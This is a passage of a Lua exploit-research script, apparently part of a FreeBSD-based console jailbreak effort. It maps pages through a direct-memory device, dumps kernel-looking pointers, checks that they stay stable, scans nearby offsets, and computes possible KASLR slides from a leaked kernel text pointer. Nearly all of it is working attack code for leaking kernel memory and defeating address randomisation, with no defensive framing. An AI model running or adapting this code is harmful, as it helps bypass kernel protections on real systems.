    return syscall.sc_mmap(0, PAGE, 1, 1, dmem_fd, 0)
end)
if m_ok then addr = m_ret:tonumber() end

if addr == 0 or addr == 0xFFFFFFFFFFFFFFFF then
    log("mmap failed")
    return table.concat(out, "\n")
end
log("mapped at " .. string.format("0x%x", addr))

-- Dump ALL non-zero qwords
local all_ptrs = {}
local nonzero_count = 0
for i = 0, PAGE - 8, 8 do
    local lo = memory.read_dword(addr + i):tonumber()
    local hi = memory.read_dword(addr + i + 4):tonumber()
    if lo ~= 0 or hi ~= 0 then
        nonzero_count = nonzero_count + 1
        local tag = ""
        if hi >= 0xFFFFFFFF and lo >= 0x80000000 then
            tag = " [KTEXT]"
            all_ptrs[#all_ptrs + 1] = {off = i, hi = hi, lo = lo, tag = "KTEXT"}
        elseif hi >= 0xFFFFF800 and hi < 0xFFFFFF00 then
            tag = " [DMAP]"
            all_ptrs[#all_ptrs + 1] = {off = i, hi = hi, lo = lo, tag = "DMAP"}
        elseif hi >= 0xFFFF0000 then
            tag = " [KHIGH]"
            all_ptrs[#all_ptrs + 1] = {off = i, hi = hi, lo = lo, tag = "KHIGH"}
        elseif hi == 0xFFFFFFFF then
            tag = " [KLOW]"
            all_ptrs[#all_ptrs + 1] = {off = i, hi = hi, lo = lo, tag = "KLOW"}
        end
        log(string.format("  +%04x: %08x%08x%s", i, hi, lo, tag))
    end
end
log("")
log("nonzero qwords: " .. nonzero_count)
log("kernel pointers: " .. #all_ptrs)

pcall(function() syscall.sc_munmap(addr, PAGE) end)

-- ============================================================
-- PART 2: Remap and check stability (same values each time?)
-- If values change between mappings, it's live hardware state
-- ============================================================
log("")
log("--- PART 2: stability check ---")

for round = 1, 3 do
    local a2 = 0
    local m2_ok, m2_ret = pcall(function()
        return syscall.sc_mmap(0, PAGE, 1, 1, dmem_fd, 0)
    end)
    if m2_ok then a2 = m2_ret:tonumber() end

    if a2 ~= 0 and a2 ~= 0xFFFFFFFFFFFFFFFF then
        -- Check the known kernel pointer at +0x18
        local lo18 = memory.read_dword(a2 + 0x18):tonumber()
        local hi18 = memory.read_dword(a2 + 0x1C):tonumber()
        -- And the first qword
        local lo00 = memory.read_dword(a2):tonumber()
        local hi00 = memory.read_dword(a2 + 4):tonumber()

        log(string.format("  round %d: @+0=%08x%08x @+18=%08x%08x",
            round, hi00, lo00, hi18, lo18))

        pcall(function() syscall.sc_munmap(a2, PAGE) end)
    end
end

-- ============================================================
-- PART 3: Offset 0x10000 dump (1963 non-zero qwords)
-- ============================================================
log("")
log("--- PART 3: offset 0x10000 dump ---")

local a3 = 0
local m3_ok, m3_ret = pcall(function()
    return syscall.sc_mmap(0, PAGE, 1, 1, dmem_fd, 0x10000)
end)
if m3_ok then a3 = m3_ret:tonumber() end

if a3 ~= 0 and a3 ~= 0xFFFFFFFFFFFFFFFF then
    -- Find the kernel pointer
    local kptrs3 = {}
    for i = 0, PAGE - 8, 8 do
        local lo = memory.read_dword(a3 + i):tonumber()
        local hi = memory.read_dword(a3 + i + 4):tonumber()
        if hi >= 0xFFFF0000 then
            kptrs3[#kptrs3 + 1] = {off = i, hi = hi, lo = lo}
        end
    end

    if #kptrs3 > 0 then
        log("  kernel pointers:")
        for _, p in ipairs(kptrs3) do
            log(string.format("    +%04x: 0x%08x%08x", p.off, p.hi, p.lo))
        end
    end

    -- Dump first 128 bytes
    log("  first 128 bytes:")
    for i = 0, 120, 8 do
        local lo = memory.read_dword(a3 + i):tonumber()
        local hi = memory.read_dword(a3 + i + 4):tonumber()
        log(string.format("    +%04x: %08x%08x", i, hi, lo))
    end

    -- Sample the dense area (find where the non-zero data starts/ends)
    local first_nz = -1
    local last_nz = -1
    for i = 0, PAGE - 8, 8 do
        local lo = memory.read_dword(a3 + i):tonumber()
        local hi = memory.read_dword(a3 + i + 4):tonumber()
        if lo ~= 0 or hi ~= 0 then
            if first_nz < 0 then first_nz = i end
            last_nz = i
        end
    end
    log(string.format("  data range: 0x%04x - 0x%04x", first_nz, last_nz))

    pcall(function() syscall.sc_munmap(a3, PAGE) end)
else
    log("  mmap failed")
end

-- ============================================================
-- PART 4: Fine-grained offset scan around page 0
-- Check every page in the first 256KB
-- ============================================================
log("")
log("--- PART 4: fine scan 0-256KB ---")

for off = 0, 0x3C000, PAGE do
    local a4 = 0
    local m4_ok, m4_ret = pcall(function()
        return syscall.sc_mmap(0, PAGE, 1, 1, dmem_fd, off)
    end)
    if m4_ok then a4 = m4_ret:tonumber() end

    if a4 ~= 0 and a4 ~= 0xFFFFFFFFFFFFFFFF then
        local nz = 0
        local kp = 0
        for i = 0, PAGE - 8, 64 do -- sample every 64 bytes
            local lo = memory.read_dword(a4 + i):tonumber()
            local hi = memory.read_dword(a4 + i + 4):tonumber()
            if lo ~= 0 or hi ~= 0 then nz = nz + 1 end
            if hi >= 0xFFFF0000 then kp = kp + 1 end
        end
        if nz > 0 then
            log(string.format("  off=0x%05x: nz_samples=%d kptr_samples=%d", off, nz, kp))
        end
        pcall(function() syscall.sc_munmap(a4, PAGE) end)
    end
end

-- ============================================================
-- PART 5: KASLR computation
-- If 0xffffffff2ec47fc0 is a kernel pointer, the KASLR slide
-- is (leaked_addr - known_symbol_offset)
-- FreeBSD kernel base without KASLR: 0xFFFFFFFF80200000
-- The offset 0x2ec47fc0 - 0x80200000 = 0xAEA47FC0
-- So KASLR slide = 0xAEA47FC0 (if this is a kernel text ptr)
-- ============================================================
log("")
log("--- PART 5: KASLR analysis ---")

-- Re-read the pointer
local a5 = 0
local m5_ok, m5_ret = pcall(function()
    return syscall.sc_mmap(0, PAGE, 1, 1, dmem_fd, 0)
end)
if m5_ok then a5 = m5_ret:tonumber() end

if a5 ~= 0 and a5 ~= 0xFFFFFFFFFFFFFFFF then
    local lo18 = memory.read_dword(a5 + 0x18):tonumber()
    local hi18 = memory.read_dword(a5 + 0x1C):tonumber()
    log(string.format("  ptr at +0x18: 0x%08x%08x", hi18, lo18))

    if hi18 == 0xFFFFFFFF then
        local full = hi18 * 0x100000000 + lo18
        log(string.format("  if kernel base=0xFFFFFFFF80200000:"))
        log(string.format("    slide = 0x%08x", lo18 - 0x80200000))
        log(string.format("  if kernel base=0xFFFFFFFF80000000:"))
        log(string.format("    slide = 0x%08x", lo18 - 0x80000000))
        log(string.format("  if kernel base=0xFFFFFFFF82200000:"))
        log(string.format("    slide = 0x%08x", lo18 - 0x82200000))
    end

    -- Also check all other kernel-like pointers for consistency
    for _, off_check in ipairs({0x318, 0x330, 0x378, 0x3F0}) do
        if off_check < PAGE then
            local lo_c = memory.read_dword(a5 + off_check):tonumber()
            local hi_c = memory.read_dword(a5 + off_check + 4):tonumber()
            log(string.format("  ptr at +0x%03x: 0x%08x%08x", off_check, hi_c, lo_c))
        end
    end

    pcall(function() syscall.sc_munmap(a5, PAGE) end)
end

pcall(function() syscall.sc_close(dmem_fd) end)

log("")
log("=== DMEM KPTR DUMP DONE ===")
log("pid final: " .. syscall.getpid():tonumber())
return table.concat(out, "\n")
```
